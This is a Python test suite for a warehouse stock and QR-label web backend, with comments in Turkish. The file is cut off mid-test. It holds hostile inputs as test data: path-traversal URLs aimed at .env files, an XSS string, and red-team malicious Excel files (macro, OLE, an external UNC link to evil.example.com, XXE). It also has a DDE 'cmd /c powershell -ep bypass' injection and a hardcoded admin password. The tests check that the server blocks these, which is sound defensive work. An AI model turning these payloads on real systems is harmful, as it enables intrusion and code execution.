import concurrent.futures
import json
import re
import sys
import unittest
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from unittest.mock import patch

BACKEND_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BACKEND_DIR))

from sqlalchemy import text  # noqa: E402
from app.database import engine  # noqa: E402
from app.qr_utils import extract_label_code, normalize_code  # noqa: E402
from app.telegram_service import (  # noqa: E402
    POLLING_ADVISORY_LOCK_KEY,
    format_warehouse_request_message,
    handle_telegram_update,
)

BASE_URL = "http://127.0.0.1:8000"
SAFE_TOKEN: str = ""


def api_call(method: str, path: str, body=None, headers=None, include_pin_token: bool = True):
    req_headers = {"Content-Type": "application/json"}
    if include_pin_token and SAFE_TOKEN:
        req_headers["X-Safe-Browser-Token"] = SAFE_TOKEN
    if headers:
        req_headers.update(headers)
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(
        f"{BASE_URL}{path}",
        data=data,
        headers=req_headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=12) as resp:
            raw = resp.read().decode("utf-8")
            lower_headers = {k.lower(): v for k, v in resp.headers.items()}
            content_type = lower_headers.get("content-type", "")
            parsed = json.loads(raw) if "application/json" in content_type else raw
            return resp.status, lower_headers, parsed
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8", errors="replace")
        lower_headers = {k.lower(): v for k, v in (exc.headers.items() if exc.headers else [])}
        content_type = lower_headers.get("content-type", "")
        try:
            parsed = json.loads(raw) if "application/json" in content_type else raw
        except Exception:
            parsed = raw
        return exc.code, lower_headers, parsed


class ComprehensiveSystemTests(unittest.TestCase):
    created_ids: list[int] = []
    saved_settings: dict[str, str] = {}

    @classmethod
    def setUpClass(cls):
        global SAFE_TOKEN
        from app.routers.auth import compute_current_time_pin

        cls.created_ids = []
        st_pin, _, pin_body = api_call(
            "POST",
            "/api/auth/pin",
            {"pin": compute_current_time_pin()},
            include_pin_token=False,
        )
        assert st_pin == 200 and pin_body.get("safe_token"), f"PIN auth failed: {pin_body}"
        SAFE_TOKEN = pin_body["safe_token"]
        with engine.begin() as conn:
            rows = conn.execute(text("SELECT key, value FROM app_settings")).fetchall()
            cls.saved_settings = {r[0]: r[1] for r in rows}
            # Test süresince gerçek Telegram grubuna test mesajı gitmemesi için geçici temizle
            conn.execute(text("DELETE FROM app_settings"))

    @classmethod
    def tearDownClass(cls):
        with engine.begin() as conn:
            if cls.created_ids:
                conn.execute(
                    text("DELETE FROM stock_items WHERE id = ANY(:ids)"),
                    {"ids": cls.created_ids},
                )
            # Ayarları test öncesi haline döndür
            conn.execute(text("DELETE FROM app_settings"))
            for k, v in cls.saved_settings.items():
                conn.execute(
                    text("INSERT INTO app_settings (key, value) VALUES (:k, :v)"),
                    {"k": k, "v": v},
                )
            # Sequence değerini mevcut en yüksek PKT koduna göre hizala
            max_code = conn.execute(
                text(
                    "SELECT COALESCE(MAX(CAST(SUBSTRING(label_code FROM 5) AS BIGINT)), 100000) "
                    "FROM stock_items WHERE label_code ~ '^PKT-[0-9]+$'"
                )
            ).scalar_one()
            next_val = max(100001, int(max_code) + 1)
            conn.execute(text(f"ALTER SEQUENCE pkt_label_seq RESTART WITH {next_val}"))

    def track(self, item_id: int) -> None:
        self.created_ids.append(item_id)

    def _track_create(self, payload: dict) -> dict:
        st, _, body = api_call("POST", "/api/stock", payload)
        self.assertEqual(st, 201, f"Create failed: {body}")
        self.created_ids.append(body["id"])
        return body

    # ------------------------------------------------------------------
    # 1. Sağlık, Statik SPA ve Path Traversal Güvenlik Testleri
    # ------------------------------------------------------------------
    def test_01_health_and_headers(self):
        st, headers, body = api_call("GET", "/api/health")
        self.assertEqual(st, 200)
        self.assertEqual(body, {"status": "ok", "database": "connected"})
        self.assertIn("application/json", headers.get("content-type", "").lower())

        st_root, root_headers, html_doc = api_call("GET", "/")
        self.assertEqual(st_root, 200)
        self.assertIn("no-store", root_headers.get("cache-control", "").lower())
        self.assertIn("<div id=\"root\"></div>", html_doc)

        st_404, _, _ = api_call("GET", "/api/unknown-route")
        self.assertEqual(st_404, 404)

        # Bozuk JSON gönderildiğinde 500 değil 422 dönmeli
        req = urllib.request.Request(
            f"{BASE_URL}/api/stock",
            data=b"{broken-json",
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            urllib.request.urlopen(req, timeout=5)
            self.fail("Malformed JSON should fail")
        except urllib.error.HTTPError as e:
            self.assertEqual(e.code, 422)

        # Var olmayan ID'ler üzerinde işlemler 404 dönmeli
        for ep in ["/api/stock/99999999/request", "/api/stock/99999999/cancel-request", "/api/stock/99999999/restore"]:
            st_nf, _, _ = api_call("POST", ep, {})
            self.assertEqual(st_nf, 404)

    def test_02_path_traversal_blocked(self):
        traversal_paths = [
            "/..%2f..%2f.env",
            "/..%5c..%5c.env",
            "/..%2f..%2fbackend%2fapp%2fconfig.py",
            "/../requirements.txt",
        ]
        for p in traversal_paths:
            st, _, content = api_call("GET", p)
            self.assertEqual(st, 200)
            # Hassas dosya içeriği yerine yalnızca SPA index.html dönmeli
            self.assertNotIn("DATABASE_URL", str(content))
            self.assertNotIn("ADMIN_PASSWORD", str(content))
            self.assertIn("<div id=\"root\"></div>", str(content))

    # ------------------------------------------------------------------
    # 2. Doğrulama, Görünmez Karakterler, Türkçe Normalizasyon & Sınırlar
    # ------------------------------------------------------------------
    def test_03_input_validation_and_unicode_edge_cases(self):
        # Sadece boşluk veya zero-width karakterler 422 dönmeli
        for bad_val in ["   ", "\u200b\ufeff\xa0", ""]:
            st, _, _ = api_call(
                "POST",
                "/api/stock",
                {"reference": bad_val, "quantity": 10, "level": "PO6"},
            )
            self.assertEqual(st, 422)

        # Geçersiz miktar değerleri
        for bad_qty in [0, -1, -999, 100001]:
            st, _, _ = api_call(
                "POST",
                "/api/stock",
                {"reference": "QA-REF-1", "quantity": bad_qty, "level": "L1"},
            )
            self.assertEqual(st, 422)

        # Türkçe karakterler ve görünmez boşluklarla oluşturma
        created = self._track_create(
            {
                "reference": "  \u200bqa-şğüöçıİ-99\xa0 ",
                "quantity": 15,
                "level": "  rev\u200b-ğüşiöç ",
                "location_note": "  Raf Özel Bölge  ",
            }
        )
        self.assertEqual(created["reference"], "QA-SGUOCII-99")
        self.assertEqual(created["level"], "REV GUSIOC")
        self.assertEqual(created["location_note"], "Raf Özel Bölge")

    def test_04_max_length_boundary_no_truncation_500(self):
        # Maksimum uzunlukta (120 ref + 80 level + 200 not + 100 personel) oluşturma ve güncelleme
        max_ref = "R" * 120
        max_lvl = "L" * 80
        max_note = "N" * 200
        max_by = "P" * 100

        created = self._track_create(
            {
                "reference": max_ref,
                "quantity": 99999,
                "level": max_lvl,
                "location_note": max_note,
                "created_by": max_by,
            }
        )
        self.assertEqual(len(created["reference"]), 120)
        self.assertGreater(len(created["qr_payload"]), 220)

        # Şimdi tekrar 120 karakterlik başka bir referansa ve 200 karakterlik yeni nota güncelle
        # (StockMovement.note 255 karakter sınırını aşmadan güvenli kesilmeli, 500 vermemeli!)
        st, _, updated = api_call(
            "PUT",
            f"/api/stock/{created['id']}",
            {
                "reference": "X" * 120,
                "level": "Y" * 80,
                "remaining_quantity": 100000,
                "location_note": "Z" * 200,
            },
        )
        self.assertEqual(st, 200, f"Update failed on max lengths: {updated}")
        self.assertEqual(updated["remaining_quantity"], 100000)

    # ------------------------------------------------------------------
    # 3. Barkod / QR Okuyucu Klavye Düzeni Simülasyonları
    # ------------------------------------------------------------------
    def test_05_scanner_keyboard_layout_variations(self):
        item = self._track_create(
            {"reference": "QA-SCAN-6683", "quantity": 40, "level": "HZE-1"}
        )
        code_num = item["label_code"].split("-")[1]
        qr = item["qr_payload"]

        # Türkçe Q klavyede US HID barkod okuyucu simülasyonları
        scanner_variants = [
            qr,
            qr.lower().replace("/", "ç").replace("-", "*"),
            qr.upper().replace("/", "Ç").replace("-", "?"),
            f"PKT*{code_num}",
            f"pkt.{code_num}",
            f"  pkt {code_num}  ",
            code_num,
        ]

        for variant in scanner_variants:
            self.assertEqual(extract_label_code(variant), item["label_code"])
            encoded = urllib.parse.quote(variant)
            st, _, looked = api_call("GET", f"/api/stock/lookup?code={encoded}")
            self.assertEqual(st, 200, f"Lookup failed for variant {variant!r}: {looked}")
            self.assertEqual(looked["id"], item["id"])

    # ------------------------------------------------------------------
    # 4. SQL LIKE Wildcard (% ve _) İzolasyon Testi
    # ------------------------------------------------------------------
    def test_06_sql_wildcard_escaping(self):
        item_underscore = self._track_create(
            {"reference": "QAWILD_100", "quantity": 5, "level": "W1"}
        )
        item_plain = self._track_create(
            {"reference": "QAWILDX100", "quantity": 5, "level": "W1"}
        )

        # 'QAWILD_100' arandığında '_' tek karakterlik joker olarak çalışıp QAWILDX100 getirmemeli
        st, _, rows = api_call(
            "GET",
            "/api/stock?q=" + urllib.parse.quote("QAWILD_100") + "&status=ALL",
        )
        self.assertEqual(st, 200)
        returned_ids = {r["id"] for r in rows}
        self.assertIn(item_underscore["id"], returned_ids)
        self.assertNotIn(item_plain["id"], returned_ids)

        # '%' arandığında rastgele kayıtlar gelmemeli
        st_pct, _, rows_pct = api_call(
            "GET",
            "/api/stock?q=" + urllib.parse.quote("%%%") + "&status=ALL",
        )
        self.assertEqual(st_pct, 200)
        self.assertEqual(len(rows_pct), 0)

    # ------------------------------------------------------------------
    # 5. Eşzamanlılık (Concurrency & Race Condition) Stres Testleri
    # ------------------------------------------------------------------
    def test_07_concurrent_full_deduct_race_condition(self):
        item = self._track_create(
            {"reference": "QA-RACE-FULL", "quantity": 25, "level": "R1"}
        )
        qr = item["qr_payload"]

        def attempt_deduct(_):
            st, _, body = api_call("POST", "/api/stock/scan-deduct", {"qr_or_code": qr})
            return st

        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
            statuses = list(pool.map(attempt_deduct, range(12)))

        # Yalnızca TAM OLARAK 1 istek 200 dönmeli, diğer 11 istek 400 dönmeli!
        self.assertEqual(statuses.count(200), 1, f"Unexpected statuses: {statuses}")
        self.assertEqual(statuses.count(400), 11, f"Unexpected statuses: {statuses}")

        st, _, detail = api_call("GET", f"/api/stock/lookup?code={item['label_code']}")
        self.assertEqual(st, 200)
        self.assertEqual(detail["remaining_quantity"], 0)
        self.assertEqual(detail["status"], "CONSUMED")

    def test_08_concurrent_partial_deduct_never_goes_negative(self):
        item = self._track_create(
            {"reference": "QA-RACE-PART", "quantity": 30, "level": "R2"}
        )
        code = item["label_code"]

        def attempt_partial(_):
            st, _, _ = api_call(
                "POST",
                "/api/stock/scan-deduct",
                {"qr_or_code": code, "deduct_quantity": 7},
            )
            return st

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            statuses = list(pool.map(attempt_partial, range(10)))

        # 30 adet içinden en fazla 4 kez 7 adet düşülebilir (4 * 7 = 28, geriye 2 kalır)
        self.assertEqual(statuses.count(200), 4, f"Statuses: {statuses}")
        self.assertEqual(statuses.count(400), 6, f"Statuses: {statuses}")

        st, _, detail = api_call("GET", f"/api/stock/lookup?code={code}")
        self.assertEqual(st, 200)
        self.assertEqual(detail["remaining_quantity"], 2)
        self.assertEqual(detail["status"], "IN_STOCK")

    def test_09_concurrent_warehouse_request_no_duplicate_spam(self):
        item = self._track_create(
            {"reference": "QA-RACE-REQ", "quantity": 18, "level": "PO6"}
        )
        item_id = item["id"]

        def attempt_req(i):
            st, _, _ = api_call(
                "POST",
                f"/api/stock/{item_id}/request",
                {"requested_note": f"Hat-{i}"},
            )
            return st

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            statuses = list(pool.map(attempt_req, range(8)))

        # Sadece 1 istek başarılı olmalı, diğer 7 istek 'zaten talep edilmiş' (400) dönmeli!
        self.assertEqual(statuses.count(200), 1, f"Statuses: {statuses}")
        self.assertEqual(statuses.count(400), 7, f"Statuses: {statuses}")

    def test_10_concurrent_label_creation_unique_codes(self):
        def create_one(i):
            st, _, body = api_call(
                "POST",
                "/api/stock",
                {"reference": f"QA-PAR-{i}", "quantity": 10 + i, "level": "P1"},
            )
            return st, body

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            results = list(pool.map(create_one, range(8)))

        codes = set()
        for st, body in results:
            self.assertEqual(st, 201)
            self.created_ids.append(body["id"])
            codes.add(body["label_code"])

        self.assertEqual(len(codes), 8)

    # ------------------------------------------------------------------
    # 6. Üretim Eşleştirme, Stoğa Geri Alma & Yönetici Brute-Force Koruması
    # ------------------------------------------------------------------
    def test_11_production_match_precision_and_restore_cycle(self):
        it1 = self._track_create({"reference": "QA-998877", "quantity": 12, "level": "PO6"})
        it2 = self._track_create({"reference": "QA-998877", "quantity": 8, "level": "PO9"})

        st, _, match_res = api_call(
            "POST",
            "/api/stock/match",
            {
                "queries": [
                    {"reference": "QA-998877", "level": "PO6"},
                    {"reference": "1", "level": "PO6"},  # Çok kısa referans yanlış eşleşmemeli
                ]
            },
        )
        self.assertEqual(st, 200)
        self.assertEqual(match_res[0]["total_exact_quantity"], 12)
        self.assertEqual(match_res[0]["total_other_quantity"], 8)
        self.assertEqual(match_res[1]["total_exact_quantity"], 0)

        # Kısmi düşüm (12 -> 5 kaldı) sonra kalan 5 adedi tam düş (5 -> 0 CONSUMED),
        # ardından Restore yapıldığında tüm ilk 12 değil, son düşülen 5 adet geri gelmeli!
        api_call("POST", "/api/stock/scan-deduct", {"qr_or_code": it1["label_code"], "deduct_quantity": 7})
        api_call("POST", "/api/stock/scan-deduct", {"qr_or_code": it1["label_code"]})

        st_rest, _, restored = api_call("POST", f"/api/stock/{it1['id']}/restore")
        self.assertEqual(st_rest, 200)
        self.assertEqual(restored["status"], "IN_STOCK")
        self.assertEqual(restored["remaining_quantity"], 5)

        # Zaten IN_STOCK olan kaydı tekrar restore etmek 400 dönmeli
        st_rest_again, _, _ = api_call("POST", f"/api/stock/{it1['id']}/restore")
        self.assertEqual(st_rest_again, 400)
        _ = it2

    def test_12_admin_password_rate_limit_and_settings_persistence(self):
        import random

        fake_ip_header = {"X-Forwarded-For": f"198.18.{random.randint(1,254)}.{random.randint(1,254)}"}

        # 10 hatalı deneme -> 401
        for _ in range(10):
            st, _, _ = api_call(
                "POST",
                "/api/settings/verify",
                {"password": "wrong-password"},
                headers=fake_ip_header,
            )
            self.assertEqual(st, 401)

        # 11. deneme (doğru şifre bile olsa bu IP kilitlendiği için) -> 429 + Retry-After
        st_locked, hdrs, _ = api_call(
            "POST",
            "/api/settings/verify",
            {"password": "twjsQ0_vay"},
            headers=fake_ip_header,
        )
        self.assertEqual(st_locked, 429)
        self.assertTrue(
            any(k.lower() == "retry-after" for k in hdrs.keys()),
            f"Missing Retry-After header in {hdrs}",
        )

        # Başka temiz IP'den doğru şifreyle ayar kaydetme & silme testi
        clean_ip = {"X-Forwarded-For": "198.51.100.42"}
        st_put, _, saved = api_call(
            "PUT",
            "/api/settings/telegram",
            {
                "password": "twjsQ0_vay",
                "telegram_chat_id": "-100555666777",
                "telegram_bot_token": "123456789:ABCDEF_TEST_TOKEN_9876",
            },
            headers=clean_ip,
        )
        self.assertEqual(st_put, 200)
        self.assertEqual(saved["telegram_chat_id"], "-100555666777")
        self.assertTrue(saved["has_bot_token"])
        self.assertIn("••••", saved["masked_bot_token"])

        # Chat ID'yi boşaltarak kaydettiğinde gerçekten temizlenmeli
        st_clr, _, cleared = api_call(
            "PUT",
            "/api/settings/telegram",
            {
                "password": "twjsQ0_vay",
                "telegram_chat_id": "",
                "clear_bot_token": True,
            },
            headers=clean_ip,
        )
        self.assertEqual(st_clr, 200)
        self.assertEqual(cleared["telegram_chat_id"], "")
        self.assertFalse(cleared["has_bot_token"])

    # ------------------------------------------------------------------
    # 7. Telegram HTML Escape & Advisory Lock & /id Komut Testleri
    # ------------------------------------------------------------------
    def test_13_telegram_xss_escape_and_advisory_lock(self):
        msg = format_warehouse_request_message(
            label_code="PKT-100001",
            reference="REF<script>&1",
            level="L<b>2",
            remaining_quantity=10,
            location_note="Raf <A & B>",
            requested_note="Hat <1>",
        )
        self.assertNotIn("<script>", msg)
        self.assertIn("&lt;script&gt;&amp;1", msg)
        self.assertIn("Raf &lt;A &amp; B&gt;", msg)

        # Advisory lock testi: İki bağlantıdan sadece biri liderliği alabilmeli
        c1 = engine.connect()
        c2 = engine.connect()
        try:
            l1 = c1.execute(
                text("SELECT pg_try_advisory_lock(:k)"), {"k": POLLING_ADVISORY_LOCK_KEY}
            ).scalar()
            if l1:
                l2 = c2.execute(
                    text("SELECT pg_try_advisory_lock(:k)"), {"k": POLLING_ADVISORY_LOCK_KEY}
                ).scalar()
                self.assertFalse(l2, "Second connection must NOT acquire the advisory lock!")
                c1.execute(
                    text("SELECT pg_advisory_unlock(:k)"), {"k": POLLING_ADVISORY_LOCK_KEY}
                )
            else:
                # Arka plandaki çalışan uvicorn sunucusu zaten kilidi tutuyor demektir!
                # Bu da çalışan sunucunun liderlik kilidini başarıyla aldığını kanıtlar!
                self.assertFalse(
                    l1, "Running server holds the advisory lock, preventing duplicate pollers!"
                )
        finally:
            c1.close()
            c2.close()

        # /id komutu konulu süper grup + özel karakterli başlık testi
        captured = []
        with patch(
            "app.telegram_service.send_telegram_message",
            side_effect=lambda **kw: (captured.append(kw), (True, None))[1],
        ):
            handle_telegram_update(
                "TOK",
                {
                    "update_id": 99,
                    "message": {
                        "message_id": 77,
                        "message_thread_id": 5,
                        "chat": {
                            "id": -100777888999,
                            "title": "Depo & Paketleme <Hat>",
                            "type": "supergroup",
                        },
                        "text": "/id@DepoBot   ",
                    },
                },
            )
        self.assertEqual(len(captured), 1)
        self.assertEqual(captured[0]["chat_id"], -100777888999)
        self.assertEqual(captured[0]["message_thread_id"], 5)
        self.assertIn("Depo &amp; Paketleme &lt;Hat&gt;", captured[0]["html_text"])

    def test_14_scan_restore_auto_and_excel_export(self):
        import io
        import time
        import openpyxl

        st, _, item = api_call(
            "POST",
            "/api/stock",
            {"reference": "TEST-RESTORE-QR", "quantity": 18, "level": "P09", "location_note": "=RAF-A1"},
        )
        self.assertEqual(st, 201)
        self.track(item["id"])

        # 1) scan-auto ilk okutmada tamamını düşmeli (DEDUCTED)
        st_auto1, _, res1 = api_call("POST", "/api/stock/scan-auto", {"qr_or_code": item["qr_payload"]})
        self.assertEqual(st_auto1, 200)
        self.assertEqual(res1["action_performed"], "DEDUCTED")
        self.assertEqual(res1["quantity_changed"], 18)
        self.assertEqual(res1["item"]["status"], "CONSUMED")

        # 2) 1.2sn dolmadan hemen tekrar okutulursa çift okutma koruması (409) devreye girmeli
        st_bounce, _, _ = api_call("POST", "/api/stock/scan-auto", {"qr_or_code": item["qr_payload"]})
        self.assertEqual(st_bounce, 409)

        # 3) 1.3sn beklendikten sonra aynı QR okutulduğunda stoğa geri almalı (RESTORED)
        time.sleep(1.3)
        st_auto2, _, res2 = api_call("POST", "/api/stock/scan-auto", {"qr_or_code": item["qr_payload"]})
        self.assertEqual(st_auto2, 200)
        self.assertEqual(res2["action_performed"], "RESTORED")
        self.assertEqual(res2["quantity_changed"], 18)
        self.assertEqual(res2["item"]["status"], "IN_STOCK")
        self.assertEqual(res2["item"]["remaining_quantity"], 18)

        # 4) Açık scan-restore aktif etikette 400 dönmeli, düşürüldükten sonra 200 ile geri almalı
        st_bad_rest, _, _ = api_call("POST", "/api/stock/scan-restore", {"qr_or_code": item["label_code"]})
        self.assertEqual(st_bad_rest, 400)

        api_call("POST", "/api/stock/scan-deduct", {"qr_or_code": item["label_code"]})
        st_ok_rest, _, restored_detail = api_call(
            "POST", "/api/stock/scan-restore", {"qr_or_code": item["qr_payload"]}
        )
        self.assertEqual(st_ok_rest, 200)
        self.assertEqual(restored_detail["status"], "IN_STOCK")
        self.assertEqual(restored_detail["remaining_quantity"], 18)

        # 5) Excel export (.xlsx) doğrulaması ve '=' formül enjeksiyonu güvenliği
        req = urllib.request.Request(
            f"{BASE_URL}/api/stock/export.xlsx?status=ACTIVE&q=TEST-RESTORE-QR",
            headers={"X-Safe-Browser-Token": SAFE_TOKEN},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            self.assertEqual(resp.status, 200)
            self.assertEqual(resp.headers.get("X-Scan-Verdict"), "CLEAN-OOXML")
            self.assertTrue(resp.headers.get("X-Content-SHA256"))
            xlsx_bytes = resp.read()
        wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
        self.assertIn("Stok Etiketleri", wb.sheetnames)
        self.assertIn("Referans Level Özeti", wb.sheetnames)
        ws = wb["Stok Etiketleri"]
        self.assertEqual(ws["B2"].value, "TEST-RESTORE-QR")
        self.assertEqual(ws["G2"].value, "=RAF-A1")
        self.assertEqual(ws["G2"].data_type, "s")
        self.assertTrue(ws["G2"].quotePrefix)

    def test_15_level_canonical_normalization_and_separation(self):
        # 1-AA, 1 aa, 1Aa, 1/aa -> hepsi 1AA olmalı
        for raw_lvl in ["1-AA", "1 aa", "1Aa", "1/aa"]:
            st, _, it = api_call(
                "POST",
                "/api/stock",
                {"reference": "TEST-LVL-SUITE", "quantity": 4, "level": raw_lvl},
            )
            self.assertEqual(st, 201)
            self.track(it["id"])
            self.assertEqual(it["level"], "1AA")

        # Yeni iki parçalı bitişik yazım -> boşluklu standart ('1AZ P98')
        st_new, _, it_new = api_call(
            "POST",
            "/api/stock",
            {"reference": "TEST-LVL-SUITE", "quantity": 6, "level": "1AZp98"},
        )
        self.assertEqual(st_new, 201)
        self.track(it_new["id"])
        self.assertEqual(it_new["level"], "1AZ P98")

        # Sonraki tireli/taksimli giriş daha önce kaydedilen '1AZ P98' formatını almalı
        st_rep, _, it_rep = api_call(
            "POST",
            "/api/stock",
            {"reference": "TEST-LVL-SUITE", "quantity": 6, "level": "1AZ-P98"},
        )
        self.assertEqual(st_rep, 201)
        self.track(it_rep["id"])
        self.assertEqual(it_rep["level"], "1AZ P98")

        # P07 ile 1AD P07 ayrı leveller olarak korunmalı
        _, _, it_p07 = api_call(
            "POST",
            "/api/stock",
            {"reference": "TEST-P07-DIFF", "quantity": 3, "level": "p-07"},
        )
        self.track(it_p07["id"])
        self.assertEqual(it_p07["level"], "P07")

        _, _, it_1ad_p07 = api_call(
            "POST",
            "/api/stock",
            {"reference": "TEST-P07-DIFF", "quantity": 8, "level": "1ADp07"},
        )
        self.track(it_1ad_p07["id"])
        self.assertEqual(it_1ad_p07["level"], "1AD P07")

        _, _, matched = api_call(
            "POST",
            "/api/stock/match",
            {"queries": [{"reference": "TEST-P07-DIFF", "level": "P07"}]},
        )
        self.assertEqual(matched[0]["total_exact_quantity"], 3)
        self.assertEqual(matched[0]["total_other_quantity"], 8)

    def test_16_pin_gate_and_excel_malware_redteam_defense(self):
        import hashlib
        import io
        import zipfile
        import openpyxl
        from datetime import datetime, timedelta, timezone
        from app.excel_security import ExcelSecurityError, inspect_and_verify_xlsx_bytes
        from app.routers.auth import TR_TZ, compute_current_time_pin

        # 0) Dinamik tarih+saat PIN formatı kontrolü: 16 Kasım 14:50 -> '16111450'
        sample_dt = datetime(2026, 11, 16, 14, 50, 25, tzinfo=TR_TZ)
        self.assertEqual(compute_current_time_pin(sample_dt), "16111450")
        self.assertEqual(compute_current_time_pin(sample_dt + timedelta(minutes=1)), "16111451")

        # 1) PIN olmadan /api/stock ve /api/stock/export.xlsx erişimi 401 dönmeli
        st_unauth, hdr_unauth, _ = api_call("GET", "/api/stock", include_pin_token=False)
        self.assertEqual(st_unauth, 401)
        self.assertIn("content-security-policy", hdr_unauth)
        self.assertEqual(hdr_unauth.get("x-content-type-options"), "nosniff")

        st_exp_unauth, _, _ = api_call("GET", "/api/stock/export.xlsx", include_pin_token=False)
        self.assertEqual(st_exp_unauth, 401)

        # 1 dakika önceki veya 1 dakika sonraki PIN kabul edilmemeli!
        prev_min_pin = compute_current_time_pin(datetime.now(timezone.utc) - timedelta(minutes=1))
        st_expired, _, _ = api_call(
            "POST",
            "/api/auth/pin",
            {"pin": prev_min_pin},
            headers={"X-Forwarded-For": "203.0.113.198"},
            include_pin_token=False,
        )
        self.assertEqual(st_expired, 401)

        # 2) Yanlış PIN denemesi 401, ardışık 12 hatalı denemede 429 rate-limit dönmeli
        import random

        troll_ip = {"X-Forwarded-For": f"198.19.{random.randint(1,254)}.{random.randint(1,254)}"}
        for _ in range(12):
            st_bad, _, _ = api_call(
                "POST",
                "/api/auth/pin",
                {"pin": "00000000"},
                headers=troll_ip,
                include_pin_token=False,
            )
            self.assertEqual(st_bad, 401)
        st_rate, _, _ = api_call(
            "POST",
            "/api/auth/pin",
            {"pin": compute_current_time_pin()},
            headers=troll_ip,
            include_pin_token=False,
        )
        self.assertEqual(st_rate, 429)

        # 3) Doğru dinamik PIN (GGAAHHDD) kalıcı HttpOnly çerez + safe_token üretmeli
        safe_ip = {"X-Forwarded-For": "203.0.113.200"}
        st_ok, ok_hdrs, ok_body = api_call(
            "POST",
            "/api/auth/pin",
            {"pin": compute_current_time_pin()},
            headers=safe_ip,
            include_pin_token=False,
        )
        self.assertEqual(st_ok, 200)
        set_cookie = ok_hdrs.get("set-cookie", "")
        self.assertIn("pkt_safe_browser=", set_cookie)
        self.assertIn("httponly", set_cookie.lower())
        cookie_pair = set_cookie.split(";", 1)[0]

        st_sess, _, sess_body = api_call(
            "GET",
            "/api/auth/session",
            headers={"Cookie": cookie_pair},
            include_pin_token=False,
        )
        self.assertEqual(st_sess, 200)
        self.assertTrue(sess_body["authenticated"])

        # 4) Red-Team Zararlı Excel Senaryoları — Hepsi anında yakalanıp engellenmeli!
        # Geçerli baz Excel al
        req = urllib.request.Request(
            f"{BASE_URL}/api/stock/export.xlsx?status=ACTIVE",
            headers={"X-Safe-Browser-Token": SAFE_TOKEN},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            clean_xlsx = resp.read()
            srv_sha = resp.headers.get("X-Content-SHA256")
        self.assertEqual(inspect_and_verify_xlsx_bytes(clean_xlsx), srv_sha)
        self.assertEqual(hashlib.sha256(clean_xlsx).hexdigest(), srv_sha)

        # Saldırı A: .xlsx kılığına sokulmuş Windows EXE (MZ)
        with self.assertRaises(ExcelSecurityError):
            inspect_and_verify_xlsx_bytes(b"MZ\x90\x00" + b"A" * 512)

        # Saldırı B: Eski tip makro/Equation Editor OLE2 konteyneri
        with self.assertRaises(ExcelSecurityError):
            inspect_and_verify_xlsx_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 512)

        # Saldırı C: Dosya sonuna eklenmiş gizli payload (Polyglot ZIP+EXE)
        with self.assertRaises(ExcelSecurityError):
            inspect_and_verify_xlsx_bytes(clean_xlsx + b"MZ_HIDDEN_PAYLOAD")

        def mutate_zip(mutator_fn) -> bytes:
            out_buf = io.BytesIO()
            with zipfile.ZipFile(io.BytesIO(clean_xlsx), "r") as zin, zipfile.ZipFile(
                out_buf, "w", zipfile.ZIP_DEFLATED
            ) as zout:
                entries = {n: zin.read(n) for n in zin.namelist()}
                mutator_fn(entries)
                for k_name, val_bytes in entries.items():
                    zout.writestr(k_name, val_bytes)
            return out_buf.getvalue()

        # Saldırı D: VBA Makrosu (xl/vbaProject.bin) enjekte edilmiş Excel
        trojan_vba = mutate_zip(lambda e: e.__setitem__("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0VBA"))
        with self.assertRaises(ExcelSecurityError):
            inspect_and_verify_xlsx_bytes(trojan_vba)

        # Saldırı E: Gömülü OLE / ActiveX nesnesi (xl/embeddings/oleObject1.bin)
        trojan_ole = mutate_zip(lambda e: e.__setitem__("xl/embeddings/oleObject1.bin", b"OLE_EXPLOIT"))
        with self.assertRaises(ExcelSecurityError):
            inspect_and_verify_xlsx_bytes(trojan_ole)

        # Saldırı F: Dış SMB/NTLM sızıntısı veya Follina ms-msdt: External Relationship
        def inject_external_rel(entries):
            rels_xml = entries["xl/_rels/workbook.xml.rels"].decode("utf-8")
            evil_rel = (
                '<Relationship Id="rId999" '
                'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                'Target="\\\\evil.example.com\\share\\payload.dotm" TargetMode="External"/></Relationships>'
            )
            entries["xl/_rels/workbook.xml.rels"] = rels_xml.replace("</Relationships>", evil_rel).encode("utf-8")

        with self.assertRaises(ExcelSecurityError):
            inspect_and_verify_xlsx_bytes(mutate_zip(inject_external_rel))

        # Saldırı G: Hücre içine gizlice <f> formülü enjekte edilmesi
        def inject_formula_tag(entries):
            s1 = entries["xl/worksheets/sheet1.xml"].decode("utf-8")
            entries["xl/worksheets/sheet1.xml"] = s1.replace(
                "</sheetData>",
                '<row r="9999"><c r="A9999"><f>HYPERLINK("http://evil.invalid","Click")</f></c></row></sheetData>',
            ).encode("utf-8")

        with self.assertRaises(ExcelSecurityError):
            inspect_and_verify_xlsx_bytes(mutate_zip(inject_formula_tag))

        # Saldırı H: XML XXE / DTD enjeksiyonu
        def inject_xxe(entries):
            wb_xml = entries["xl/workbook.xml"].decode("utf-8")
            entries["xl/workbook.xml"] = (
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]>' + wb_xml
            ).encode("utf-8")

        with self.assertRaises(ExcelSecurityError):
            inspect_and_verify_xlsx_bytes(mutate_zip(inject_xxe))

        # 5) Veritabanına DDE / Komut enjeksiyonlu metin girildiğinde Excel'de etkisizleştirilmeli
        dde_item = self._track_create(
            {
                "reference": "TEST-DDE-SAFE",
                "quantity": 5,
                "level": "1AA",
                "location_note": "=CMD|'/C powershell -ep bypass'!A0",
            }
        )
        req_dde = urllib.request.Request(
            f"{BASE_URL}/api/stock/export.xlsx?status=ACTIVE&q={dde_item['label_code']}",
            headers={"X-Safe-Browser-Token": SAFE_TOKEN},
        )
        with urllib.request.urlopen(req_dde, timeout=10) as resp_dde:
